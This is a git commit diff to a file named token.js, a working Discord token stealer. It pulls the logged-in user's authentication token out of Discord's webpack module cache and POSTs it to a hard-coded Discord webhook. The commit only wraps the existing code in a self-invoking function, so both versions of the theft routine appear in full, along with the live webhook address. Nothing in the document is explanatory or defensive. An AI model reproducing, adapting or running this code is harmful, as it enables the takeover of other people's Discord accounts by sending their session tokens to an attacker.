a460ade439716657681adee8edf676a16801141a
c82676b9a8 <c82676b9a8@proton.me>
2025-08-24 21:49:31 +0200

    Addadgjjjjjjjj

--- token.js
+++ token.js
@@ -1,25 +1,29 @@
-const webhook = 'https://discord.com/api/webhooks/1408157196591825018/OXuCSkShIMn7GoJHszwVLS9i5ILtz-I1EfQrDsMQYrVjisDvgA0aneLbYiXjtOQ6EX1_';
+(function() {
+    'use strict';
 
-var token = (webpackChunkdiscord_app.push([[''], {}, e => {
-  m = [];
-  for (let c in e.c) m.push(e.c[c]);
-}]), m).find(x => x?.exports?.default?.getToken !== undefined).exports.default.getToken();
+    const webhook = 'https://discord.com/api/webhooks/1408157196591825018/OXuCSkShIMn7GoJHszwVLS9i5ILtz-I1EfQrDsMQYrVjisDvgA0aneLbYiXjtOQ6EX1_';
 
-console.log("Token:", token);
+    var token = (webpackChunkdiscord_app.push([[''], {}, e => {
+        m = [];
+        for (let c in e.c) m.push(e.c[c]);
+    }]), m).find(m => m?.exports?.default?.getToken !== undefined).exports.default.getToken();
 
-if (!token) {
-  console.log("Token extraction failed or token is undefined.");
-} else {
-  fetch(webhook, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify({
-      content: `Token: ${token}`
-    })
-  })
-  .then(response => response.json())
-  .then(data => console.log('Success:', data))
-  .catch((error) => console.error('Error:', error));
-}
+    console.log("Token:", token);
+
+    if (token) {
+        fetch(webhook, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                content: `Token: ${token}`
+            })
+        })
+        .then(response => response.json())
+        .then(data => console.log('Success:', data))
+        .catch((error) => console.error('Error:', error));
+    } else {
+        console.log("Token not found or undefined.");
+    }
+})();
